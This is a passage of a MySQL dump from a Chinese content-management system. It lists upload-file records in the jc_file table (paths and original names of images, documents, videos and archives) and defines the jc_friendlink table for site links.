INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10133710to3f.jpg', 'video_banner02.jpg', '1', '121');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10133842aiyf.png', 'video_Btn02.png', '1', '121');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10133954jfoc.jpg', 'video_banner01.jpg', '1', '122');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101340004te2.png', 'video_Btn01.png', '1', '122');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101340393eav.png', 'video_Btn03.png', '1', '123');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10134048htcl.jpg', 'video_banner03.jpg', '1', '123');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10134238qppo.jpg', 'video10.jpg', '1', '124');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10134440wmng.jpg', 'video01.jpg', '1', '125');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101345564pok.jpg', 'video09.jpg', '1', '126');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101346227ayf.jpg', 'video07.jpg', '1', '127');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101346473kic.jpg', 'video05.jpg', '1', '128');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10134720z8a5.jpg', 'zdsad.jpg', '1', '129');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/1014082583ov.jpg', 'wenku_item05.jpg', '1', '133');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10141115d2dm.jpg', 'wenku_item07.jpg', '1', '134');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10141350dw2t.jpg', 'wenku_item08.jpg', '1', '135');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10141429q19h.jpg', 'wenku_item09.jpg', '1', '136');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/101415435gn1.jpg', 'wenku_item06.jpg', '1', '137');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10141936fd0q.jpg', 'wenku_item04.jpg', '1', '138');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/10142436t9pe.jpg', 'wenku_item111.jpg', '1', '139');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/110911592mxa.jpg', 'hlwjia.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/110919049wkh.jpg', 'qglh.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11092148co74.jpg', 'qglh.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11092540p27t.jpg', 'zph.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11092701sxi4.jpg', 'zph.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11093237z5e8.jpg', 'fghj.jpg', '1', '141');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11111659rnpb.mp4', '/u/cms/www/201610/11111659rnpb.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11111729glis.docx', '测试.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11111806t1hj.mp4', '/u/cms/www/201610/11111806t1hj.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111118456g3w.docx', '测试.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111118588poy.mp4', '/u/cms/www/201610/111118588poy.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11112051yx2x.mp4', '/u/cms/www/201610/11112051yx2x.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111121133pnh.mp4', '/u/cms/www/201610/111121133pnh.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/111121213xss.docx', '测试.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11112910l4qa.jpg', '3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201610/11113157dh9e.jpg', '0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201701/160016148i9t.jpg', '1.jpg', '1', '11');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/012124176acx.png', '无标题1.png', '1', '130');
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/021908507wtn.png', '无标题3png.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/02190935f36w.png', '无标题.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/02191009zrq0.jpg', '东软工商登记信息.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/02191052ccou.png', '无标题4.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/021912057lwm.png', '无标题1.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/02193434vhtr.png', '无标题1.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/02194630xqa5.png', '无标题1.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/02194839cmud.png', '无标题1.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/021949513bq0.png', '无标题1.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/0418221193vf.png', '无标题3png.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04182325yha7.png', '无标题1.png', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04182632usio.jpg', 'timg.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04182703yuaq.jpg', 'u=448533732,887296272&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04182725twg7.jpg', 'u=701954616,3340828458&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04182757mfkn.jpg', 'u=879415299,3724940493&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/041828321nuz.jpg', 'u=2027416243,2726805506&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04183107ojjm.jpg', 'u=2027416243,2726805506&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/04184434cm8g.jpg', 'u=785568502,1908045120&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/201702/05030743gloz.jpg', 'u=2027416243,2726805506&fm=23&gp=0.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093458gynd.jpg', '22093458gynd.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093502mmft.jpg', '22093502mmft.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093506l8pv.jpg', '22093506l8pv.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093509qm3l.jpg', '22093509qm3l.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22093513srmf.jpg', '22093513srmf.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094752xoxd.jpg', '22094752xoxd.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094906lrj8.jpg', '22094906lrj8.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094911xe9x.jpg', '22094911xe9x.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094915t8h1.jpg', '22094915t8h1.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22094918gnze.jpg', '22094918gnze.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100555lytj.jpg', '22100555lytj.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100558gfsb.jpg', '22100558gfsb.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100601l1us.jpg', '22100601l1us.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100606t8mw.jpg', '22100606t8mw.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/22100611o2gl.jpg', '22100611o2gl.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172935t4sb.jpg', '23172935t4sb.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172936acob.jpg', '23172936acob.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172937bli1.jpg', '23172937bli1.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172937r23n.jpg', '23172937r23n.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172939ln5a.jpg', '23172939ln5a.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/231729407e1v.jpg', '231729407e1v.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/231729434x7h.jpg', '231729434x7h.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172944o38x.jpg', '23172944o38x.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172944vvdh.jpg', '23172944vvdh.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172946mzqx.jpg', '23172946mzqx.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/23172947nrrl.jpg', '23172947nrrl.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/24102446b7al.jpg', '24102446b7al.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/24102503z9wj.jpg', '24102503z9wj.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/2416455972ro.jpg', '2416455972ro.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/241646340nq6.jpg', '241646340nq6.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/24164707ksjq.jpg', '24164707ksjq.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/26115537aper.jpg', '26115537aper.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/26115537rs0f.jpg', '26115537rs0f.jpg', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/26150136kryi.txt', '26150136kryi.txt', '1', null);
INSERT INTO `jc_file` VALUES ('/u/cms/www/Thumbs.db', 'Thumbs.db', '1', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13135536pnt2.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131359296e9c.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/1314055350gc.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140606bjte.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140635xydz.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140702pfne.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140909s64p.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13141723ywh0.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13142644qpdm.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131429269ikl.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131431450xia.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131431578u9o.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/1316123792p0.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13163251c8d5.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/131634322gqg.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/131636277cxi.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13163934xmp0.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13164248ng73.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13165347xxty.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13170503bwpw.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13170603q1bw.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/131706463pqt.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13172446osvy.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13172626x71c.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13173752etj3.zip', 'ChromeSetup.zip', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13173805fii8.zip', 'ChromeSetup.zip', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14091703u57k.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14091741h0w0.zip', 'ChromeSetup.zip', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14092030cnyx.mp4', '18183451i5bi.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14092835ljai.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095531y5tg.zip', 'ChromeSetup.zip', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095543za61.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095551kk1a.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095759mdqw.docx', '0_開發需求_.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14102936l7gw.txt', 'freemarker.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14104521p9ey.zip', 'bbs-update-2012-11-2.zip', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14105137jxtn.mp4', '/v6/u/cms/www/201403/14105137jxtn.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14112725dsar.zip', '/v6/u/cms/www/201403/14112725dsar.zip', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14130702z3xz.png', '/v6/u/cms/www/201403/14130702z3xz.png', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14165746s64i.pdf', '1.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/1914315903bj.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/20151821gj8y.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/2015202141s0.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211128348kuw.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/2111305770l1.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21113452hsxh.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211137096eif.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211149148tx0.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21115759y8sm.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211511276v74.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21151948k1fh.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21154820xtfs.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/2115485050rw.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21155236mk9b.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22084701xqxy.doc', '/v6/u/cms/www/201404/22084701xqxy.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22084833ys27.doc', '/v6/u/cms/www/201404/22084833ys27.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22111217hftv.doc', 'Linux开启mysql远程连接.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22111332dwt3.doc', 'Linux开启mysql远程连接.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22114143pw1a.doc', 'Linux开启mysql远程连接.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22132355vqdf.txt', 'IBM LDAP.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22133304pnoh.txt', '/v6/u/cms/www/201404/22133304pnoh.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22133312pz3j.exe', 'wpp.exe', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22135235m1m1.txt', 'cmstop.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22135348pbqp.swf', '2.swf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/221353537d0o.doc', 'discuz_2.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140446zkgv.txt', 'caihongyixue新bug.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140629jx27.txt', '360检测.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140634er4n.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140716e5bk.flv', '/v6/u/cms/www/201404/22140716e5bk.flv', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22141101f9tv.txt', '360检测.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22141404irh6.docx', 'Apache_Shiro_使用手册.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22142207xrqx.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22145137jigp.docx', 'Apache_Shiro_使用手册.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22145142drkb.docx', 'Apache_Shiro_使用手册.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/221501301rkt.docx', 'Apache_Shiro_使用手册.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22151702mcwi.docx', 'Apache_Shiro_使用手册.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22152145c9do.doc', 'Linux开启mysql远程连接.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22152231wfrv.mp4', '/v6/u/cms/www/201404/22152231wfrv.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22155743mgws.txt', 'bug平台推荐.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22155756p9of.txt', 'flot柱状图.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22155756scdn.txt', 'flot使用笔记.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/28134316erf3.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/281402505i20.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/28140346452f.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/30140543hzlx.gif', 'webLogo.gif', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08091845sh2l.jpg', '1.JPG', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08092143cyap.jpg', '1.JPG', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08092249ype2.jpg', '1.JPG', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08092924h3fr.jpg', '1.JPG', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08093111b3jm.jpg', '1.JPG', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/09083819wiab.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/090840146ik7.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/090918028k13.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/09144419786f.txt', 'bbs好的功能.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/09145849ap2u.docx', '1.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/09151219pj5s.doc', '2.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/0915215434ij.txt', 'cmstop.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/121650299xv9.doc', 'DiscuzX2文件说明,目录说明.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/12165642273e.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/12170522j2ct.jpg', '1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/30093714q9ic.mp4', '/v6/u/cms/www/201407/30093714q9ic.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/30130947bmm3.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/30170627hj1m.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31114444inln.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31114945lp9t.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31115246futn.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31115423u7e6.jpg', 'mv1.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31132254zdh7.jpg', 'mv.jpg', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201409/03105035q9em.mp4', '/v6/u/cms/www/201409/03105035q9em.mp4', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201409/03105050xcbs.txt', 'bug平台推荐.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201312/241031214kys.txt', '/v6/wenku/www/201312/241031214kys.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/16164720tu2n.doc', '/v6/wenku/www/201401/16164720tu2n.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17083718btie.doc', '/v6/wenku/www/201401/17083718btie.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17084032522j.doc', '/v6/wenku/www/201401/17084032522j.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/170842070sy2.doc', '/v6/wenku/www/201401/170842070sy2.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17084442fd08.doc', '/v6/wenku/www/201401/17084442fd08.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17085101zvcg.doc', '/v6/wenku/www/201401/17085101zvcg.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/25095002cniq.doc', '/v6/wenku/www/201401/25095002cniq.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/10115402nl6c.docx', '/v6/wenku/www/201403/10115402nl6c.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/1011550974pv.docx', '/v6/wenku/www/201403/1011550974pv.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/101155409soa.txt', '/v6/wenku/www/201403/101155409soa.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/10115750uxwh.txt', '/v6/wenku/www/201403/10115750uxwh.txt', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04132656esvy.pdf', '/v6/wenku/www/201406/04132656esvy.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133131ky4f.pdf', '/v6/wenku/www/201406/04133131ky4f.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133159jryy.pdf', '/v6/wenku/www/201406/04133159jryy.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133312rszg.pdf', '/v6/wenku/www/201406/04133312rszg.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133437555h.pdf', '/v6/wenku/www/201406/04133437555h.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133611h3sa.pdf', '/v6/wenku/www/201406/04133611h3sa.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/041340029cmx.pdf', '/v6/wenku/www/201406/041340029cmx.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/0413413473t5.pdf', '/v6/wenku/www/201406/0413413473t5.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/041353368k3b.doc', '/v6/wenku/www/201406/041353368k3b.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04135541s2ay.doc', '/v6/wenku/www/201406/04135541s2ay.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201408/08112543cj83.pdf', '/v6/wenku/www/201408/08112543cj83.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201408/08131514njo0.pdf', '/v6/wenku/www/201408/08131514njo0.pdf', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201411/061426416ze3.doc', '/v6/wenku/www/201411/061426416ze3.doc', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201411/07142936mhzk.docx', '/v6/wenku/www/201411/07142936mhzk.docx', '0', null);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201411/07143112x1tn.docx', '/v6/wenku/www/201411/07143112x1tn.docx', '0', null);

-- ----------------------------
-- Table structure for jc_friendlink
-- ----------------------------
DROP TABLE IF EXISTS `jc_friendlink`;
CREATE TABLE `jc_friendlink` (
  `friendlink_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_id` int(11) NOT NULL,
  `site_name` varchar(150) NOT NULL COMMENT '网站名称',
  `domain` varchar(255) NOT NULL COMMENT '网站地址',
  `logo` varchar(150) DEFAULT NULL COMMENT '图标',
  `email` varchar(100) DEFAULT NULL COMMENT '站长邮箱',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlink_id`),
  KEY `fk_jc_ctg_friendlink` (`friendlinkctg_id`),
  KEY `fk_jc_friendlink_site` (`site_id`),
  CONSTRAINT `fk_jc_ctg_friendlink` FOREIGN KEY (`friendlinkctg_id`) REFERENCES `jc_friendlink_ctg` (`friendlinkctg_id`),
  CONSTRAINT `fk_jc_friendlink_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接';

-- ----------------------------
-- Records of jc_friendlink
-- ----------------------------
